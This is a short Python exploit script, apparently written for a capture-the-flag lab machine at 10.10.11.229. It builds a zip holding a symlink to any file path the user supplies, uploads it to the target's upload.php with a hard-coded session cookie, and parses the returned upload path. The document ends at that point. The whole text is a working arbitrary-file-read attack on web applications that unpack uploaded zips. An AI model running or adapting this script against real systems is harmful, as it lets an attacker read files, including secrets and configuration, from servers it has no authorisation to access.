#!/usr/bin/python3
import subprocess
import sys
import requests
import re

if len(sys.argv) < 2:
    print(f"[!] usage: {sys.argv[0]} path/to/file/to/read")
    exit()

# create link
subprocess.call(['rm', 'example.pdf'])
subprocess.call(['ln', '-s', sys.argv[1], 'example.pdf'])

# create zipfile
subprocess.call(['rm', 'file.zip'])
subprocess.call(['zip', '--symlink', 'file.zip', 'example.pdf'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

# upload malicious zipfile to server
with open('file.zip', 'rb') as zipfile:
    headers = {
        'Cookie': 'PHPSESSID=fm9dspqjf37u2f176ig3g7gcco'
    }
    multipartFormData = {
        'zipFile': ('file.zip', zipfile, 'application/zip'),
        'submit': (None, 'submit')
    }
    r = requests.post(url='http://10.10.11.229/upload.php', headers=headers, files=multipartFormData)

uploadPath = re.search(r'>(uploads/(.*)\.pdf)', r.content.decode()).group(1)
